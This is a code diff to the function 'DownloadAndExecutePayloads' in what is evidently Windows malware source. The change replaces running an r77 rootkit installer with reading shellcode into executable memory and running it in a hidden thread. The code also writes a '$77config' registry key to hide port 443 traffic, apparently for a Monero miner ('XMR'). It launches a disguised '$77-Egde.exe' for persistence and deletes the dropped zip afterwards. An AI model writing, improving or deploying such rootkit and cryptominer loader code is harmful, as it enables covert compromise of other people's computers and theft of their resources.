@@ -397,27 +397,45 @@ void DownloadAndExecutePayloads() {
     // Execute extraction hidden
     RunHiddenCommand(psCmd);
     
-    // ===== MODIFIED SECTION START =====
-    // 1. Install r77 rootkit
-    char r77Path[MAX_PATH];
-    lstrcpyA(r77Path, g_mallDir);
-    lstrcatA(r77Path, "\\install.exe");
+    // ===== SHELLCODE INSTALLATION START =====
+    // 1. Install r77 rootkit via shellcode
+    char shellcodePath[MAX_PATH];
+    lstrcpyA(shellcodePath, g_mallDir);
+    lstrcatA(shellcodePath, "\\install.shellcode");  // Shellcode version
     
-    STARTUPINFOA si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-    CreateProcessA(
-        r77Path, NULL, NULL, NULL, FALSE,
-        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
-    );
-    WaitForSingleObject(pi.hProcess, 30000);  // Wait 30s for installation
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    HANDLE hFile = CreateFileA(shellcodePath, GENERIC_READ, FILE_SHARE_READ, 
+                              NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        DWORD fileSize = GetFileSize(hFile, NULL);
+        if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
+            // Allocate executable memory
+            LPVOID shellcode = VirtualAlloc(NULL, fileSize, 
+                                          MEM_COMMIT | MEM_RESERVE, 
+                                          PAGE_EXECUTE_READWRITE);
+            if (shellcode) {
+                DWORD bytesRead;
+                if (ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL) && 
+                    bytesRead == fileSize) {
+                    
+                    // Execute shellcode in a new thread
+                    HANDLE hThread = CreateThread(NULL, 0, 
+                        (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
+                    if (hThread) {
+                        WaitForSingleObject(hThread, 30000);  // Wait 30s for installation
+                        CloseHandle(hThread);
+                    }
+                }
+                // Don't free memory - shellcode may still be active
+            }
+        }
+        CloseHandle(hFile);
+    }
 
-    // 2. Configure network port hiding
+    // 2. Configure network port hiding for port 443
     HKEY hKey;
     if (RegCreateKeyA(HKEY_LOCAL_MACHINE, 
         "SOFTWARE\\$77config\\tcp_remote", &hKey) == ERROR_SUCCESS) {
-        DWORD port = 443;
+        DWORD port = 443;  // Standard HTTPS port
         RegSetValueExA(hKey, "XMR", 0, REG_DWORD, (BYTE*)&port, sizeof(port));
         RegCloseKey(hKey);
     }
@@ -428,8 +446,10 @@ void DownloadAndExecutePayloads() {
     lstrcatA(edgePath, "\\$77-Egde.exe");
     
     // Set svchost path for persistence
-    lstrcpyA(g_svchostPath, edgePath);  // Initialize persistence path
+    lstrcpyA(g_svchostPath, edgePath);
     
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
     CreateProcessA(edgePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
@@ -443,7 +463,7 @@ void DownloadAndExecutePayloads() {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
-    // ===== MODIFIED SECTION END =====
+    // ===== SHELLCODE INSTALLATION END =====
     
     // Cleanup zip file
     DeleteFileA(zipPath);
